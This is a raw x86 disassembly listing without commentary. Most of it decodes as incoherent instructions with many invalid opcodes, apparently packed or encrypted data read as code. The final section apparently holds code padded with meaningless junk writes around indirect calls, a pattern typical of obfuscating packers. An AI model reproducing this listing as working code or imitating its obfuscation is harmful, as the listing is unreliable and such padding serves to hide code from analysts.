  403126:	aad    0x4
  403128:	sbb    ebx,ebp
  40312a:	nop
  40312b:	push   0x5c
  40312d:	mov    ebx,0x4c4c2a35
  403132:	mov    esp,esi
  403134:	fcom   QWORD PTR [ecx+0xf]
  403137:	ror    BYTE PTR [edx+0xb],1
  40313a:	jmp    0x722a78ff
  40313f:	dec    ecx
  403140:	js     0x4031b8
  403142:	jnp    0x4031c3
  403144:	xchg   esp,eax
  403145:	xor    esi,DWORD PTR [eax]
  403147:	fwait
  403148:	adc    BYTE PTR [edx-0x4a1f8d16],cl
  40314e:	test   DWORD PTR [edx+0x1c],ebp
  403151:	repnz mov dh,BYTE PTR [eax-0x41]
  403155:	in     eax,dx
  403156:	sbb    BYTE PTR [edx],ch
  403158:	lods   al,BYTE PTR ds:[si]
  40315a:	inc    edx
  40315b:	xor    al,0x13
  40315d:	test   eax,0xe5436a5
  403162:	out    dx,eax
  403163:	xchg   ch,bl
  403165:	rcr    al,0xc7
  403168:	(bad)  
  40316a:	test   BYTE PTR [ebp+0x7a],ch
  40316d:	pop    ds
  40316e:	xor    BYTE PTR [edi+0x4bae2186],bh
  403174:	iret   
  403175:	(bad)  
  403176:	lea    eax,[ebx-0x6ad01177]
  40317c:	or     DWORD PTR [ecx],0x6c
  40317f:	xor    al,BYTE PTR [edi+edx*4-0x7285b87a]
  403186:	push   ebp
  403187:	icebp  
  403188:	icebp  
  403189:	mov    cl,0xe7
  40318b:	jb     0x4031da
  40318d:	jae    0x4031d0
  40318f:	cdq    
  403190:	out    dx,eax
  403191:	leave  
  403192:	cs loope 0x403195
  403195:	mov    esp,0x549eedf9
  40319a:	pop    es
  40319b:	in     eax,dx
  40319c:	pushf  
  40319d:	cmc    
  40319e:	daa    
  40319f:	dec    esi
  4031a0:	or     BYTE PTR [ebp-0x78],cl
  4031a3:	ins    DWORD PTR es:[edi],dx
  4031a4:	jae    0x4031f1
  4031a6:	rcl    DWORD PTR [ecx-0x6d],0x8f
  4031aa:	pop    ecx
  4031ab:	addr16 pop esp
  4031ad:	dec    ebp
  4031ae:	jne    0x403141
  4031b0:	push   eax
  4031b1:	sbb    BYTE PTR [edi+0x69],ah
  4031b4:	pushf  
  4031b5:	mov    eax,0x9e28c07e
  4031ba:	push   edx
  4031bb:	cld    
  4031bc:	adc    al,0x5f
  4031be:	pop    esp
  4031bf:	pop    esi
  4031c0:	es ins BYTE PTR es:[edi],dx
  4031c2:	mov    WORD PTR [ebp+0x0],es
  4031c5:	mov    al,ds:0x908bee1f
  4031ca:	clc    
  4031cb:	sub    ebx,esp
  4031cd:	int3   
  4031ce:	mov    ds:0xcbc53087,eax
  4031d3:	sar    DWORD PTR [eax+0x3d2397fc],cl
  4031d9:	push   esi
  4031da:	sbb    eax,0xfc9cf7e
  4031df:	int    0xce
  4031e1:	mov    ebx,0x36d5c421
  4031e6:	sahf   
  4031e7:	pop    ebx
  4031e8:	mov    esi,0xe395655d
  4031ed:	jle    0x40324a
  4031ef:	push   ebx
  4031f0:	mov    BYTE PTR [edi-0x30],ch
  4031f3:	xor    eax,esp
  4031f5:	sbb    ah,BYTE PTR [edi+ebx*4+0xc6a6221]
  4031fc:	(bad)  
  4031fd:	lods   al,BYTE PTR ds:[esi]
  4031fe:	mov    al,ds:0x2f2c6601
  403203:	adc    BYTE PTR [eax],ch
  403205:	ret    0x9788
  403208:	in     al,0xd9
  40320a:	inc    eax
  40320b:	aam    0xe0
  40320d:	icebp  
  40320e:	sub    eax,0xcf3a8dcc
  403213:	fiadd  DWORD PTR ds:0x8510dc07
  403219:	lods   al,BYTE PTR ds:[esi]
  40321a:	jae    0x4031b1
  40321c:	and    al,dl
  40321e:	cs call 0xe26b76e3
  403224:	jne    0x40322d
  403226:	jl     0x4031f8
  403228:	ficomp DWORD PTR [eax+edi*1+0x4b]
  40322c:	cmp    al,0xd8
  40322e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40322f:	outs   dx,DWORD PTR ds:[esi]
  403230:	sbb    al,BYTE PTR [ecx+0x4e]
  403233:	mov    edx,ecx
  403235:	mov    ah,0x91
  403237:	pusha  
  403238:	int3   
  403239:	sub    al,al
  40323b:	loop   0x403224
  40323d:	shl    DWORD PTR [ecx+0x70],0x73
  403241:	xor    DWORD PTR [edx],0x1
  403244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403245:	lahf   
  403246:	add    al,0x1a
  403248:	pop    edi
  403249:	div    BYTE PTR [ecx]
  40324b:	mov    ch,0xbd
  40324d:	fsubr  QWORD PTR [ecx]
  40324f:	dec    esi
  403250:	outs   dx,BYTE PTR ds:[esi]
  403251:	jnp    0x4031e7
  403253:	sar    DWORD PTR [ecx],0xaf
  403256:	in     al,0x8f
  403258:	pop    edx
  403259:	aad    0x97
  40325b:	(bad)  
  40325c:	adc    bh,ch
  40325e:	rol    BYTE PTR [esi],0x7a
  403261:	fadd   QWORD PTR [edx+0xabea064]
  403267:	jne    0x40326a
  403269:	jge    0x403226
  40326b:	mov    eax,ds:0x24734a38
  403270:	pop    ecx
  403271:	cmp    ebx,DWORD PTR [eax+eiz*4+0x60]
  403275:	rol    BYTE PTR [edi],1
  403277:	xchg   DWORD PTR [ecx-0x5c],esi
  40327a:	shl    al,cl
  40327c:	cs popf 
  40327e:	jne    0x403258
  403280:	loopne 0x403257
  403282:	mov    esp,0xdd8b4e8d
  403287:	sub    al,0x59
  403289:	sbb    eax,0x6f2a00ee
  40328e:	jmp    0x403250
  403290:	cmove  ebp,esp
  403293:	dec    ebp
  403294:	sbb    esi,esi
  403296:	popf   
  403297:	pop    ds
  403298:	mov    dl,0xa7
  40329a:	int3   
  40329b:	shl    bl,1
  40329d:	sub    DWORD PTR [ebp+ecx*1+0x37],ebp
  4032a1:	in     eax,dx
  4032a2:	fwait
  4032a3:	xchg   ecx,eax
  4032a4:	stos   DWORD PTR es:[edi],eax
  4032a5:	inc    esi
  4032a6:	cli    
  4032a7:	rol    DWORD PTR [edx+0x5e6c64c0],cl
  4032ad:	ror    ecx,1
  4032af:	jmp    0x9990:0xbf0eec2c
  4032b6:	popa   
  4032b7:	or     eax,ebp
  4032b9:	enter  0xa3ef,0xf4
  4032bd:	inc    edi
  4032be:	imul   edi,DWORD PTR ds:[edi],0x88ef64f3
  4032c5:	fcom   DWORD PTR [esi+0x5d]
  4032c8:	mov    al,ds:0xb4455364
  4032cd:	dec    esp
  4032ce:	ret    0xa8d4
  4032d1:	pop    eax
  4032d2:	push   ds
  4032d3:	in     al,dx
  4032d4:	jnp    0x40326f
  4032d6:	sbb    ebx,DWORD PTR [ebx+0x5ebb675a]
  4032dc:	mov    cl,0x0
  4032de:	(bad)  
  4032df:	jbe    0x4032b5
  4032e1:	mov    bh,0x1e
  4032e3:	dec    edi
  4032e4:	add    DWORD PTR [ebx+ebp*2+0x27eb711b],eax
  4032eb:	add    eax,0x8019942d
  4032f0:	pop    ebx
  4032f1:	int3   
  4032f2:	xchg   edx,eax
  4032f3:	rcr    DWORD PTR [ecx+edx*4],1
  4032f6:	push   edi
  4032f7:	mov    al,cl
  4032f9:	mov    edi,0xf4cdd62e
  4032fe:	xlat   BYTE PTR ds:[ebx]
  4032ff:	int    0x72
  403301:	pop    ds
  403302:	push   ecx
  403303:	pop    es
  403304:	pop    edi
  403305:	lds    eax,FWORD PTR [eax+0x59]
  403308:	(bad)  
  403309:	(bad)  [edx+ecx*1+0x60ad6b70]
  403310:	stc    
  403311:	imul   esi,DWORD PTR [eax-0x286c8fa5],0x5768b5af
  40331b:	cmp    dl,BYTE PTR [edi]
  40331d:	jmp    0x7e6e:0x4499a9a4
  403324:	retf   
  403325:	sbb    esp,DWORD PTR [edi+ebx*8+0x6acb1a9]
  40332c:	xlat   BYTE PTR ds:[ebx]
  40332d:	sbb    al,0x17
  40332f:	push   ebp
  403330:	sbb    eax,0xec9de367
  403335:	mov    al,ds:0x2659194a
  40333a:	retf   
  40333b:	iret   
  40333c:	aam    0xa7
  40333e:	pop    ebp
  40333f:	mov    WORD PTR [eax+0x16cd3b8e],?
  403345:	repz or dh,BYTE PTR [edi+eiz*8+0xb4c71ab]
  40334d:	push   ecx
  40334e:	adc    BYTE PTR [eax],0x43
  403351:	xchg   ebp,eax
  403352:	xchg   ecx,esi
  403354:	cmp    ah,BYTE PTR [ebx+0x7ccac511]
  40335a:	ja     0x403366
  40335c:	mov    ch,0x4
  40335e:	rol    DWORD PTR [edx-0x3b3e2f56],1
  403364:	ficomp WORD PTR [ecx-0x48818ae6]
  40336a:	or     al,0xb9
  40336c:	cmp    ah,BYTE PTR [edi+ebp*1]
  40336f:	jmp    0xc00acf02
  403374:	cmp    BYTE PTR [ecx-0x5c79eb5f],al
  40337a:	xor    bl,BYTE PTR [eax+0x4]
  40337d:	icebp  
  40337e:	mov    ds:0xa0b447d9,eax
  403383:	aad    0xd8
  403385:	xchg   esi,eax
  403386:	dec    edx
  403387:	inc    edx
  403388:	dec    ecx
  403389:	popf   
  40338a:	aaa    
  40338b:	imul   ecx,DWORD PTR [esi+ecx*4+0x63af66d],0x93d9e281
  403396:	mov    DWORD PTR [ebx+ecx*8-0x31],edi
  40339a:	icebp  
  40339b:	or     eax,0x43806dc0
  4033a0:	mov    fs,ebx
  4033a2:	cmp    dl,BYTE PTR [ecx+0x39]
  4033a5:	rcr    DWORD PTR [esi-0x12],cl
  4033a8:	cmp    dl,BYTE PTR [ebx-0x68]
  4033ab:	pop    ecx
  4033ac:	nop
  4033ad:	jg     0x4033d8
  4033af:	(bad)  
  4033b0:	lods   al,BYTE PTR ds:[esi]
  4033b1:	jae    0x4033ff
  4033b3:	addr16 loop 0x4033b3
  4033b6:	xchg   edx,eax
  4033b7:	cmp    BYTE PTR [eax-0x5f],bl
  4033ba:	(bad)  
  4033bb:	jge    0x403348
  4033bd:	or     DWORD PTR [ebp+0x20],ebx
  4033c0:	sbb    dl,BYTE PTR ds:0x2c0f2546
  4033c6:	repnz and BYTE PTR [esi+0x211cf671],0xbf
  4033ce:	dec    ecx
  4033cf:	outs   dx,BYTE PTR ds:[esi]
  4033d0:	cmp    eax,0x8b10b1ed
  4033d5:	jbe    0x40338f
  4033d7:	clc    
  4033d8:	fidivr DWORD PTR [edx]
  4033da:	push   0x62
  4033dc:	mov    bl,BYTE PTR [eax+0x52]
  4033df:	cmp    al,0xb4
  4033e1:	add    DWORD PTR [ebx+0x65],esp
  4033e4:	inc    eax
  4033e5:	jmp    0x8002:0xfd90251e
  4033ec:	push   edi
  4033ed:	add    bl,BYTE PTR [edi]
  4033ef:	push   es
  4033f0:	push   edx
  4033f1:	cli    
  4033f2:	dec    ebx
  4033f3:	pop    esi
  4033f4:	jo     0xeb5ce156
  4033fa:	add    al,0x7b
  4033fc:	adc    esi,DWORD PTR [esi]
  4033fe:	je     0x4033c7
  403400:	mov    cl,0x2
  403402:	dec    ecx
  403403:	or     eax,0x7dc6ce7b
  403408:	leave  
  403409:	lock lahf 
  40340b:	pusha  
  40340c:	xchg   ebx,eax
  40340d:	mov    eax,ds:0xe212
  403412:	enter  0xf36a,0x13
  403416:	js     0x40347c
  403418:	mov    WORD PTR [ecx+0x6f44c95c],ds
  40341e:	arpl   ax,cx
  403420:	pusha  
  403421:	push   ebx
  403422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403423:	cmp    ebx,DWORD PTR [edx+0x246edf54]
  403429:	out    dx,al
  40342a:	and    edi,eax
  40342c:	aad    0x4d
  40342e:	hlt    
  40342f:	dec    ebp
  403430:	test   al,0xe8
  403432:	mov    BYTE PTR [esi-0xe5bb138],cl
  403438:	sub    eax,0x956f7946
  40343d:	test   BYTE PTR [ebx],al
  40343f:	dec    eax
  403440:	mov    ds:0xe9638041,eax
  403445:	mov    dl,0x89
  403447:	sbb    al,0x89
  403449:	mov    dl,0xaa
  40344b:	add    al,BYTE PTR ds:0xb4dcc03b
  403451:	retf   0xcd4b
  403454:	ins    BYTE PTR es:[edi],dx
  403455:	test   al,0xc
  403457:	mov    ebx,0xb6423c3d
  40345c:	push   0x92566b0e
  403461:	xor    eax,0xe63bfd0e
  403466:	xor    eax,0xff69e80
  40346c:	cmp    eax,0x666f5f92
  403471:	out    0xb1,eax
  403473:	xor    BYTE PTR [edi-0x2c],al
  403476:	rol    DWORD PTR [esi],1
  403478:	jo     0x4033fa
  40347a:	and    BYTE PTR [ecx-0x67],bl
  40347d:	dec    eax
  40347e:	iret   
  40347f:	retf   
  403480:	cmp    eax,0x840af86c
  403485:	jmp    DWORD PTR ds:0x85a54b16
  40348b:	add    BYTE PTR [ecx],0xc1
  40348e:	scas   al,BYTE PTR es:[edi]
  40348f:	dec    bx
  403491:	pushf  
  403492:	loopne 0x40343d
  403494:	scas   eax,DWORD PTR es:[edi]
  403495:	adc    BYTE PTR [ebx],bl
  403497:	scas   al,BYTE PTR es:[edi]
  403498:	pop    eax
  403499:	add    esi,edx
  40349b:	data16 (bad) 
  40349d:	call   0x4f36e434
  4034a2:	cmp    DWORD PTR ds:0xc81ea1e,ecx
  4034a8:	mov    es,WORD PTR [esi+ebp*1+0xd2acd86]
  4034af:	jne    0x4034fa
  4034b1:	popa   
  4034b2:	jge    0x40347e
  4034b4:	gs cld 
  4034b6:	and    dl,BYTE PTR [ecx-0x7b0975d9]
  4034bc:	fsub   QWORD PTR [ecx]
  4034be:	imul   ecx,edx,0xffffffc6
  4034c1:	mov    BYTE PTR [esi+0x71],cl
  4034c4:	leave  
  4034c5:	sbb    al,0x3a
  4034c7:	push   ecx
  4034c8:	test   esi,ecx
  4034ca:	stc    
  4034cb:	ret    
  4034cc:	mov    bh,0xbc
  4034ce:	rcl    BYTE PTR [ebx+0x21],0x7e
  4034d2:	jo     0x4034b4
  4034d4:	xchg   esi,eax
  4034d5:	jbe    0x4034ff
  4034d7:	sbb    DWORD PTR [ecx-0x6c],edi
  4034da:	sub    DWORD PTR [edx-0x621f773],edx
  4034e0:	mov    cl,0xb5
  4034e2:	or     eax,0xc830cc0f
  4034e7:	aas    
  4034e8:	pop    ds
  4034e9:	fwait
  4034ea:	mov    ah,0x95
  4034ec:	mov    BYTE PTR [ebx],bl
  4034ee:	rcl    bl,1
  4034f0:	sub    BYTE PTR ds:0x74babc65,bl
  4034f6:	loopne 0x403500
  4034f8:	sar    DWORD PTR [eax],0x18
  4034fb:	mov    ?,WORD PTR [ebx]
  4034fd:	aaa    
  4034fe:	pop    edi
  4034ff:	lahf   
  403500:	mov    ecx,0x922bb46d
  403505:	shr    BYTE PTR [ebx+0x7bd09c10],cl
  40350b:	sub    cl,BYTE PTR [edx-0x78]
  40350e:	daa    
  40350f:	xor    dh,BYTE PTR [edi+0x2f03bdfe]
  403515:	mov    esp,0xf2923a1e
  40351a:	rcr    DWORD PTR [eax+0x5d6c4b43],1
  403520:	mov    ebx,0xca01c501
  403525:	adc    ebx,DWORD PTR [esi-0x44]
  403528:	ins    DWORD PTR es:[edi],dx
  403529:	mov    ds:0xaaad74f2,eax
  40352e:	or     BYTE PTR [ecx+eiz*2],bh
  403531:	jb     0x40353e
  403533:	jno    0x4034ca
  403535:	pop    ss
  403536:	test   DWORD PTR [edx-0x6ed52e36],ebx
  40353c:	sar    DWORD PTR [edx-0x4],0xdb
  403540:	test   BYTE PTR [ebx-0x5c9572de],ch
  403546:	cmc    
  403547:	aam    0x69
  403549:	adc    eax,0x759b7cec
  40354e:	loopne 0x403598
  403550:	dec    ebp
  403551:	jl     0x4035c5
  403553:	pusha  
  403554:	sub    BYTE PTR [ebx],bh
  403556:	pop    es
  403557:	je     0x4035bb
  403559:	aaa    
  40355a:	std    
  40355b:	daa    
  40355c:	icebp  
  40355d:	popf   
  40355e:	mul    DWORD PTR [eax]
  403560:	or     al,0x51
  403562:	jb     0x4034f8
  403564:	sub    bh,ch
  403566:	xchg   ah,al
  403568:	sub    eax,0xa2c7ce84
  40356d:	fs mov gs,edi
  403570:	rol    DWORD PTR [edi],1
  403572:	stos   BYTE PTR es:[edi],al
  403573:	ja     0x4035a1
  403575:	push   esi
  403576:	stc    
  403577:	push   0xffffffc1
  403579:	inc    edi
  40357a:	into   
  40357b:	les    esp,FWORD PTR [esi+0x488ace91]
  403581:	rcl    DWORD PTR [esi+0x2a81afa3],0x15
  403588:	sti    
  403589:	repnz pop ecx
  40358b:	mov    esi,0x4538e9c6
  403590:	sbb    al,dl
  403592:	push   esi
  403593:	or     BYTE PTR [edx+0x7b],dl
  403596:	push   es
  403597:	inc    eax
  403598:	mul    BYTE PTR [esi+ecx*4-0x630b44f7]
  40359f:	pop    ds
  4035a0:	loopne 0x403606
  4035a2:	ret    
  4035a3:	mov    ecx,0x248f8292
  4035a8:	stc    
  4035a9:	dec    ebp
  4035aa:	add    eax,0xac961b70
  4035af:	mov    eax,0xb0ce687d
  4035b4:	pop    esp
  4035b5:	clc    
  4035b6:	sahf   
  4035b7:	enter  0x21b,0x6f
  4035bb:	mov    cl,0xbd
  4035bd:	fist   DWORD PTR [ebp+0x10]
  4035c0:	mov    BYTE PTR [edi],bl
  4035c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035c3:	enter  0xa834,0xb5
  4035c7:	adc    al,0x8f
  4035c9:	in     eax,0x66
  4035cb:	arpl   WORD PTR [ebp+0x58594ece],dx
  4035d1:	and    ch,BYTE PTR [ecx+ebx*8+0x7f]
  4035d5:	dec    eax
  4035d6:	pop    edi
  4035d7:	lods   eax,DWORD PTR ds:[esi]
  4035d8:	jmp    0xb32e6898
  4035dd:	sahf   
  4035de:	jl     0x403647
  4035e0:	lea    edi,[eax+0x6e]
  4035e3:	enter  0x7019,0x87
  4035e7:	lods   al,BYTE PTR ds:[esi]
  4035e8:	pop    ebx
  4035e9:	rcr    bh,0x75
  4035ec:	mov    edi,0xbdc7ded4
  4035f1:	int3   
  4035f2:	xchg   esp,eax
  4035f3:	mov    bl,0xc5
  4035f5:	jno    0x40361f
  4035f7:	and    eax,0x17c152be
  4035fc:	aad    0x57
  4035fe:	std    
  4035ff:	and    bh,BYTE PTR [eax-0x3d]
  403602:	jl     0x40363d
  403604:	push   ecx
  403605:	aas    
  403606:	js     0x403670
  403608:	or     BYTE PTR [edi-0x61541646],bh
  40360e:	retf   
  40360f:	xor    bh,bl
  403611:	dec    ecx
  403612:	mov    ds:0xdef7b90e,eax
  403617:	in     eax,0x57
  403619:	push   0xffffffca
  40361b:	into   
  40361c:	xchg   ebp,eax
  40361d:	push   esp
  40361e:	cmp    DWORD PTR [edx],eax
  403620:	push   ss
  403621:	xchg   esp,eax
  403622:	adc    DWORD PTR [ebx-0x40],esp
  403625:	test   ax,0xf3eb
  403629:	pop    ss
  40362a:	mov    BYTE PTR [edi+0x1e],0x92
  40362e:	loope  0x40368e
  403630:	mov    al,0x16
  403632:	imul   eax,ebx,0x52
  403635:	ins    DWORD PTR es:[edi],dx
  403636:	sub    eax,0x937c598
  40363b:	add    eax,0xe331ca5c
  403640:	push   esi
  403641:	mov    ds:0xbce9d109,eax
  403646:	push   ss
  403647:	sub    BYTE PTR [edx-0x42],dl
  40364a:	loope  0x4035ee
  40364c:	cld    
  40364d:	dec    esi
  40364e:	fsub   DWORD PTR [edi+0x1db609c2]
  403654:	(bad)  
  403655:	in     eax,0x29
  403657:	jnp    0x40368a
  403659:	popa   
  40365a:	inc    ebx
  40365b:	(bad)  
  40365c:	pop    edx
  40365d:	aaa    
  40365e:	fisttp WORD PTR [edx+edi*4+0x265f7363]
  403665:	aaa    
  403666:	xlat   BYTE PTR ds:[ebx]
  403667:	cdq    
  403668:	call   0x42ff:0x36ebe1ab
  40366f:	jecxz  0x403665
  403671:	mov    al,0x38
  403673:	cmp    edi,eax
  403675:	test   eax,0x41a06204
  40367a:	test   edx,eax
  40367c:	dec    esp
  40367d:	mov    DWORD PTR [ebx+0x31ebebca],eax
  403683:	enter  0x19ac,0x16
  403687:	pop    esp
  403688:	mul    BYTE PTR [eax]
  40368a:	lods   eax,DWORD PTR ds:[esi]
  40368b:	int    0x1a
  40368d:	mov    edi,esi
  40368f:	test   eax,0xeed76d84
  403694:	mov    WORD PTR [esp+edx*8],?
  403697:	push   ebp
  403698:	sub    eax,0xb956e071
  40369d:	aad    0x28
  40369f:	sbb    esi,DWORD PTR [edx+0x0]
  4036a2:	cmp    ebp,DWORD PTR ds:0xe1476a39
  4036a8:	sub    al,0x73
  4036aa:	mov    eax,0x6436aa22
  4036af:	ins    DWORD PTR es:[edi],dx
  4036b0:	dec    ebx
  4036b1:	test   DWORD PTR [edx+0xe],eax
  4036b4:	stc    
  4036b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b6:	adc    esp,DWORD PTR [eax-0x40]
  4036b9:	outs   dx,DWORD PTR ds:[esi]
  4036ba:	fist   WORD PTR [edx-0x6558308f]
  4036c0:	(bad)  
  4036c1:	push   ss
  4036c2:	sub    DWORD PTR [edi+0x72a3693a],edi
  4036c8:	jmp    0x4036bc
  4036ca:	lods   al,BYTE PTR ds:[esi]
  4036cb:	add    ch,BYTE PTR [eax+0x6a]
  4036ce:	xchg   esi,eax
  4036cf:	ret    
  4036d0:	loope  0x4036cb
  4036d2:	imul   ecx,DWORD PTR [edi],0x1b4982b9
  4036d8:	leave  
  4036d9:	mov    bl,0x2f
  4036db:	scas   eax,DWORD PTR es:[edi]
  4036dc:	fdivr  st(3),st
  4036de:	mov    edi,cs
  4036e0:	pop    eax
  4036e1:	pop    edi
  4036e2:	(bad)  
  4036e3:	iret   
  4036e4:	pop    ss
  4036e5:	xchg   esi,eax
  4036e6:	and    BYTE PTR [ecx],dl
  4036e8:	dec    esi
  4036e9:	pop    edi
  4036ea:	push   ds
  4036eb:	jbe    0x4036ff
  4036ed:	ins    DWORD PTR es:[edi],dx
  4036ee:	mov    eax,0x469f6dc8
  4036f3:	or     BYTE PTR [eax],ch
  4036f5:	mov    edi,0xc91ff769
  4036fa:	repz aad 0x58
  4036fd:	stos   DWORD PTR es:[edi],eax
  4036fe:	mov    ds:0x6ecd5fd9,eax
  403703:	cmp    ecx,DWORD PTR [edi+0x4bddbb5e]
  403709:	mov    edx,DWORD PTR [ebp-0x58]
  40370c:	xchg   BYTE PTR [edi+0x63bbc115],ch
  403712:	and    eax,0x2600557
  403717:	in     eax,dx
  403718:	clc    
  403719:	dec    eax
  40371a:	in     eax,0xdb
  40371c:	imul   ebp,edx,0xffffffc2
  40371f:	xor    eax,0xf8d76f98
  403724:	jns    0x4036ca
  403726:	cmp    al,0x54
  403728:	xor    DWORD PTR [ebx],edi
  40372a:	rcl    BYTE PTR [edi+0x10],cl
  40372d:	outs   dx,DWORD PTR ds:[esi]
  40372e:	sbb    al,ah
  403730:	in     eax,0x41
  403732:	cld    
  403733:	leave  
  403734:	dec    ebx
  403735:	or     al,0x16
  403737:	out    0x35,al
  403739:	pop    ebp
  40373a:	scas   al,BYTE PTR es:[edi]
  40373b:	gs ja  0x4037b2
  40373e:	(bad)
  403741:	repz test dh,ch
  403744:	xor    ecx,esp
  403746:	mov    DWORD PTR [eax+eax*8],0xf61b6186
  40374d:	pushf  
  40374e:	dec    esp
  40374f:	pop    edi
  403750:	ret    0x694e
  403753:	ret    
  403754:	cmp    ah,BYTE PTR [eax-0x38628a20]
  40375a:	pop    edi
  40375b:	pop    edx
  40375c:	mov    dl,0x6d
  40375e:	sbb    eax,DWORD PTR [ebx+0x4b]
  403761:	rcl    DWORD PTR gs:[ebp+0x429bb6a3],cl
  403768:	ret    0x8be1
  40376b:	mov    ah,0xfb
  40376d:	cmp    al,0x53
  40376f:	retf   
  403770:	shr    BYTE PTR [edx-0x5dff886b],1
  403776:	jmp    0x40371e
  403778:	add    al,0x7c
  40377a:	pop    esi
  40377b:	ficom  DWORD PTR [ecx+0x1d]
  40377e:	gs xor al,0xb6
  403781:	imul   ebp,esp,0x76
  403784:	xor    ah,BYTE PTR [edi]
  403786:	out    dx,al
  403787:	test   BYTE PTR ds:0x42619e02,bh
  40378d:	mov    BYTE PTR [esi-0x5f5107cc],cl
  403793:	mov    dl,bl
  403795:	fcomp  DWORD PTR [ebp+0x35]
  403798:	shl    DWORD PTR [eax-0x80],0x55
  40379c:	xor    DWORD PTR [ecx],ebx
  40379e:	gs aam 0x57
  4037a1:	outs   dx,BYTE PTR ds:[esi]
  4037a2:	fcmovbe st,st(3)
  4037a4:	idiv   BYTE PTR [ecx-0x3ae15983]
  4037aa:	mov    ch,0x6b
  4037ac:	(bad)  
  4037ad:	lea    eax,[esi+0x11cd1815]
  4037b3:	inc    esp
  4037b4:	ret    
  4037b5:	push   ds
  4037b6:	sub    bh,BYTE PTR ds:0x54954d80
  4037bc:	test   DWORD PTR [ebp-0x50ddb52c],esp
  4037c2:	enter  0x807c,0x24
  4037c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037c7:	pop    es
  4037c8:	(bad)  
  4037c9:	jecxz  0x403805
  4037cb:	pop    ebx
  4037cc:	test   DWORD PTR es:[ecx-0x4a0ef9de],ebp
  4037d3:	xlat   BYTE PTR ds:[ebx]
  4037d4:	in     eax,0x8c
  4037d6:	je     0x40381e
  4037d8:	nop
  4037d9:	fadd   QWORD PTR [edi]
  4037db:	jle    0x4037b9
  4037dd:	fs lahf 
  4037df:	jge    0x403766
  4037e1:	mov    al,ds:0xa54ed4e5
  4037e6:	sbb    dl,cl
  4037e8:	adc    eax,0x24f3eaac
  4037ed:	clc    
  4037ee:	cwde   
  4037ef:	pop    esp
  4037f0:	mov    bh,0xaa
  4037f2:	cmp    eax,0xa0540532
  4037f7:	stos   DWORD PTR es:[edi],eax
  4037f8:	xor    DWORD PTR [edx+eiz*8],edi
  4037fb:	xchg   edi,eax
  4037fc:	ror    DWORD PTR [ebx+0x40087a5],0x8a
  403803:	and    eax,0xc841941a
  403808:	push   ss
  403809:	add    ah,BYTE PTR fs:[edi]
  40380c:	lds    eax,FWORD PTR [ebp+0x1e]
  40380f:	pop    edi
  403810:	jmp    0x1b465528
  403815:	mov    eax,DWORD PTR [ebp-0x10]
  403818:	mov    ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x432eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x432e97,0x432e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x432e4b,0x432eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x432e2b
  403852:	add    DWORD PTR ds:0x432eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x432e57,0x1e
  403865:	cmp    DWORD PTR ds:0x432e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x432e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x43fdeb
  40388d:	cmp    DWORD PTR ds:0x432e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x432e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x432e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x432e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x432e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x432e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x432e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x432ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x432ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x432e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x432eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x432e57
  40392d:	xor    DWORD PTR ds:0x432e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x432e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x432e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x432e73,edx
  403953:	cmp    DWORD PTR ds:0x432e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x432e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x43fdef
  403973:	cmp    DWORD PTR ds:0x432e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x432e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x432e83,0x432e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x432e47,0xcba
